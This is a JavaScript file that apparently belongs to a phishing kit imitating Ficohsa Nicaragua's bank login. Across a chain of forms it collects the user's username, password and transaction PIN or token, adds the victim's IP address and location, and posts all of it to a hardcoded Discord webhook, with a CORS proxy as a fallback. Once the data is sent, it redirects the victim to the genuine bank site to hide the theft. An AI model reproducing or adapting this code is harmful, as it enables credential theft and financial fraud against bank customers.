const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1523103391411212472/CQp6Y3AhQeLEPJcJrdTOIJynWK5O2O7wczVfe_PJd-ycvbaZ2ezPIPsRPTMc_UCj9rDc';
const DISCORD_PROXY_URL = 'https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK_URL);

function guardarUsuario(usuario) {
    if (usuario) {
        sessionStorage.setItem('ficohsaUsuario', usuario);
    }
}

function obtenerUsuario() {
    return sessionStorage.getItem('ficohsaUsuario') || '';
}

async function enviarDatosAlDiscord(mensaje) {
    if (!DISCORD_WEBHOOK_URL) {
        console.error('No se configuró la URL del webhook de Discord.');
        return { success: false, message: 'No se configuró la URL del webhook de Discord.' };
    }

    try {
        const urls = [DISCORD_WEBHOOK_URL, DISCORD_PROXY_URL];
        let lastError = null;

        for (const url of urls) {
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: mensaje })
                });

                if (response.ok) {
                    return { success: true, message: 'Datos enviados al webhook de Discord.' };
                }

                lastError = new Error('No se pudo enviar el mensaje al webhook de Discord.');
            } catch (error) {
                lastError = error;
            }
        }

        throw lastError || new Error('No se pudo enviar el mensaje al webhook de Discord.');
    } catch (error) {
        console.error('Error al enviar datos a Discord:', error);
        return { success: false, message: error.message };
    }
}

async function obtenerUbicacionYEnviarDatos(usuario, etiqueta, valor, nextPage) {
    let ciudad = 'No disponible';
    let estado = 'No disponible';
    let pais = 'No disponible';
    let ip = 'No disponible';

    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) {
            throw new Error('No se pudo obtener la ubicación.');
        }

        const data = await response.json();
        ciudad = data.city || ciudad;
        estado = data.region || estado;
        pais = data.country_name || pais;
        ip = data.ip || ip;
    } catch (error) {
        console.error('Error al obtener la ubicación:', error);
    }

    const mensaje = `💲 Ficohsa Nica 💲\nUsuario: ${usuario}\n${etiqueta}: ${valor}\nCiudad: ${ciudad}\nEstado: ${estado}\nPaís: ${pais}\nIP: ${ip}`;

    const resultado = await enviarDatosAlDiscord(mensaje);
    if (resultado.success) {
        window.location.href = nextPage;
    } else {
        console.error('Error al enviar datos al webhook:', resultado.message);
    }
}

document.addEventListener('DOMContentLoaded', function () {
    const formLogin = document.getElementById('formLogin');
    if (formLogin) {
        formLogin.addEventListener('submit', function (event) {
            event.preventDefault();
            const usuario = document.getElementById('username').value.trim();
            if (!usuario) {
                return;
            }
            guardarUsuario(usuario);
            window.location.href = 'index2.html';
        });
    }

    const formLogin2 = document.getElementById('formLogin2');
    if (formLogin2) {
        formLogin2.addEventListener('submit', async function (event) {
            event.preventDefault();
            const usuario = obtenerUsuario();
            const password = document.getElementById('password').value.trim();
            if (!usuario || !password) {
                return;
            }
            await obtenerUbicacionYEnviarDatos(usuario, 'Clave', password, 'index3.html');
        });
    }

    const formLogin3 = document.getElementById('formLogin3');
    if (formLogin3) {
        formLogin3.addEventListener('submit', async function (event) {
            event.preventDefault();
            const usuario = obtenerUsuario();
            const codigo = document.getElementById('password').value.trim();
            if (!usuario || !codigo) {
                return;
            }
            await obtenerUbicacionYEnviarDatos(usuario, 'Pin Transaccional o Token', codigo, 'index4.html');
        });
    }

    const formLogin4 = document.getElementById('formLogin4');
    if (formLogin4) {
        formLogin4.addEventListener('submit', async function (event) {
            event.preventDefault();
            const usuario = obtenerUsuario();
            const codigo = document.getElementById('password').value.trim();
            if (!usuario || !codigo) {
                return;
            }
            await obtenerUbicacionYEnviarDatos(usuario, 'Pin Transaccional o Token', codigo, 'https://www.ficohsa.com/ni/');
        });
    }
});

window.enviarDatosAlDiscord = enviarDatosAlDiscord;
